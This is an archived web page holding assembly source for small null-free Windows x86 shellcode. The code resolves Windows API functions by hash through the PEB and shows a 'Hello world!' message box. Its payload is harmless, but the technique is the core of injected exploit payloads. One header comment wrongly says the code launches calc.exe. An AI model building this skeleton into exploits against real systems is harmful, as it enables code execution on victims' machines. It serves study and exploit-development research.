<html><head><title>Windows - null-free 32-bit Windows shellcode that shows a message box - 140 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
; Copyright (c) 2009-2010, Berend-Jan &quot;SkyLined&quot; Wever &lt;berendjanwever@gmail.com&gt;
; Project homepage: http://code.google.com/p/w32-dl-loadlib-shellcode/
; All rights reserved. See COPYRIGHT.txt for details.
BITS 32
; Windows x86 null-free shellcode that executes calc.exe.
; Works in any application for Windows 5.0-7.0 all service packs.
; (See http://skypher.com/wiki/index.php/Hacking/Shellcode).
; This version uses 16-bit hashes.

%include 'w32-msgbox-shellcode-hash-list.asm'

%define B2W(b1,b2)                      (((b2) &lt;&lt; 8) + (b1))
%define W2DW(w1,w2)                     (((w2) &lt;&lt; 16) + (w1))
%define B2DW(b1,b2,b3,b4)               (((b4) &lt;&lt; 24) + ((b3) &lt;&lt; 16) + ((b2) &lt;&lt; 8) + (b1))

%ifdef STACK_ALIGN
    AND     SP, 0xFFFC
%endif
find_hash: ; Find ntdll's InInitOrder list of modules:
    XOR     ESI, ESI                    ; ESI = 0
    PUSH    ESI                         ; Stack = 0
    MOV     ESI, [FS:ESI + 0x30]        ; ESI = &amp;(PEB) ([FS:0x30])
    MOV     ESI, [ESI + 0x0C]           ; ESI = PEB-&gt;Ldr
    MOV     ESI, [ESI + 0x1C]           ; ESI = PEB-&gt;Ldr.InInitOrder (first module)
next_module: ; Get the baseaddress of the current module and find the next module:
    MOV     EBP, [ESI + 0x08]           ; EBP = InInitOrder[X].base_address
    MOV     ESI, [ESI]                  ; ESI = InInitOrder[X].flink == InInitOrder[X+1]
get_proc_address_loop: ; Find the PE header and export and names tables of the module:
    MOV     EBX, [EBP + 0x3C]           ; EBX = &amp;(PE header)
    MOV     EBX, [EBP + EBX + 0x78]     ; EBX = offset(export table)
    ADD     EBX, EBP                    ; EBX = &amp;(export table)
    MOV     ECX, [EBX + 0x18]           ; ECX = number of name pointers
    JCXZ    next_module                 ; No name pointers? Next module.
next_function_loop: ; Get the next function name for hashing:
    MOV     EDI, [EBX + 0x20]           ; EDI = offset(names table)
    ADD     EDI, EBP                    ; EDI = &amp;(names table)
    MOV     EDI, [EDI + ECX * 4 - 4]    ; EDI = offset(function name)
    ADD     EDI, EBP                    ; EDI = &amp;(function name)
    XOR     EAX, EAX                    ; EAX = 0
    CDQ                                 ; EDX = 0
hash_loop: ; Hash the function name and compare with requested hash
    XOR     DL, [EDI]
    ROR     DX, BYTE hash_ror_value
    SCASB
    JNE     hash_loop
    CMP     DX, hash_user32_MessageBoxA
    JE      found_MessageBoxA           ;
    CMP     DX, hash_kernel32_LoadLibraryA
    LOOPNE  next_function_loop          ; Not the right hash and functions left in module? Next function
    JNE     next_module                 ; Not the right hash and no functions left in module? Next module
found_MessageBoxA:
    ; Found the right hash: get the address of the function:
    MOV     EDX, [EBX + 0x24]           ; EDX = offset ordinals table
    ADD     EDX, EBP                    ; EDX = &amp;oridinals table
    MOVZX   EDX, WORD [EDX + 2 * ECX]   ; EDX = ordinal number of function
    MOV     EDI, [EBX + 0x1C]           ; EDI = offset address table
    ADD     EDI, EBP                    ; EDI = &amp;address table
    ADD     EBP, [EDI + 4 * EDX]        ; EBP = &amp;(function)
    TEST    ESI, ESI
    JZ      show_MesageBoxA
    PUSH    B2DW('3', '2', ' ', ' ')    ; Stack = &quot;er32&quot;, 0
    PUSH    B2DW('u', 's', 'e', 'r')    ; Stack = &quot;  user32&quot;, 0
    PUSH    ESP                         ; Stack = &amp;(&quot;  user32&quot;), &quot;  user32&quot;, 0
    CALL    EBP                         ; LoadLibraryA(&amp;(&quot;  user32&quot;));
    XCHG    EAX, EBP                    ; EBP = &amp;(user32.dll)
    XOR     ESI, ESI                    ; ESI = 0
    PUSH    ESI                         ; Stack = 0, &quot;  user32&quot;, 0
    JMP     get_proc_address_loop

show_MesageBoxA:
    ; create the &quot;Hello world!&quot; string
    PUSH    B2DW('r', 'l', 'd', '!')    ; Stack = &quot;rld!&quot;, 0, &quot;  user32&quot;, 0
    PUSH    B2DW('o', ' ', 'w', 'o')    ; Stack = &quot;o world!&quot;, 0, &quot;  user32&quot;, 0
    PUSH    B2DW('H', 'e', 'l', 'l')    ; Stack = &quot;Hello world!&quot;, 0, &quot;  user32&quot;, 0
    PUSH    ESP                         ; Stack = &amp;(&quot;Hello world!&quot;), &quot;Hello world!&quot;, 0, &quot;  user32&quot;, 0
    XCHG    EAX, [ESP]                  ; Stack = 0, &quot;Hello world!&quot;, 0, &quot;  user32&quot;, 0
    PUSH    EAX                         ; Stack = &amp;(&quot;Hello world!&quot;), 0, &quot;Hello world!&quot;, 0, &quot;  user32&quot;, 0
    PUSH    EAX                         ; Stack = &amp;(&quot;Hello world!&quot;), &amp;(&quot;Hello world!&quot;), 0, &quot;Hello world!&quot;, 0, &quot;  user32&quot;, 0
    PUSH    ESI                         ; Stack = 0, &amp;(&quot;Hello world!&quot;), &amp;(&quot;Hello world!&quot;), 0, &quot;Hello world!&quot;, 0, &quot;  user32&quot;, 0
    CALL    EBP                         ; MessageBoxA(NULL, &amp;(&quot;Hello world!&quot;), &amp;(&quot;Hello world!&quot;), MB_OK);
    INT3                                ; Crash

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
